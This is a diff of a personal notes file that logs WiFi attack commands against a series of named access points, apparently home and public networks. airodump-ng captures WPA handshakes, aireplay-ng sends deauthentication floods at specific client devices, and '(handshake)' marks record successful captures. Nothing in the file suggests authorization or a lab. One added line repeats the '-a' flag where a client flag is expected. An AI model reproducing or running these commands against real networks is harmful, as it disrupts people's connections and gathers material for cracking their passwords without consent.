@@ -5,10 +5,11 @@
 airodump-ng -c 2 --bssid D8:32:14:72:E0:51 -w 1108 wlan0mon (handshake)
 
 
-airodump-ng -c 11 --bssid 48:0E:EC:7C:17:E4 -w 480eec7c17e4-chen-17B wlan0mon
+airodump-ng -c 11 --bssid 48:0E:EC:7C:17:E4 -w 480eec7c17e4-chen-17B wlan0mon (handshake)
+aireplay-ng -0 10 -a 48:0E:EC:7C:17:E4 -c E2:C0:96:8A:95:F9 wlan0mon
 
 
-airodump-ng -c 12 --bssid 50:89:65:27:6A:98 -w 508965276a98-cpp001 wlan0mon
+airodump-ng -c 12 --bssid 50:89:65:27:6A:98 -w 508965276a98-cpp001 wlan0mon (handshake)
 aireplay-ng -0 10 -a 50:89:65:27:6A:98 -c 4C:EA:AE:88:39:DF wlan0mon
 
 
@@ -41,6 +42,29 @@ airodump-ng -c 7 --bssid 56:FA:84:4A:7C:55 -w fa844a7c55-Guest_7C55 wlan0mon
 airodump-ng -c 11 --bssid C8:BF:4C:44:DB:82 -w c8bf4c44db82-K2P_5794 wlan0mon (handshake)
 aireplay-ng -0 10 -a C8:BF:4C:44:DB:82 -c 44:23:7C:8D:12:25 wlan0mon
 
+
+airodump-ng -c 10 --bssid D4:35:38:80:63:B8 -w d435388063b8-Thea wlan0mon (handshake)
+aireplay-ng -0 10 -a D4:35:38:80:63:B8 -c B0:46:92:28:D6:7B wlan0mon
+
+
+airodump-ng -c 6 --bssid A4:1A:3A:13:8A:EC -w a41a3a138aec-TP-LINK_8AEC wlan0mon
+
+
+
+airodump-ng -c 11 --bssid 44:F9:71:35:28:40 -w 44f971352840-MERCURY_2840 wlan0mon
+
+
+
+airodump-ng -c 4 --bssid C8:BF:4C:05:E2:FA -w c8bf4c05e2fa-Xiaomi_A0FD-1207 wlan0mon (handshake)
+aireplay-ng -0 10 -a C8:BF:4C:05:E2:FA -a 88:2D:53:59:EC:3D wlan0mon
+
+
+
+airodump-ng -c 11 --bssid 08:6B:D1:2B:65:D0 -w 086bd12b65d0-ChinaNet-rJZc wlan0mon
+
+
+
+airodump-ng -c 11 --bssid  FC:37:2B:35:73:19 -w fc372b357319-ChinaNet-QQ wlan0mon (handshake)
 
 
 
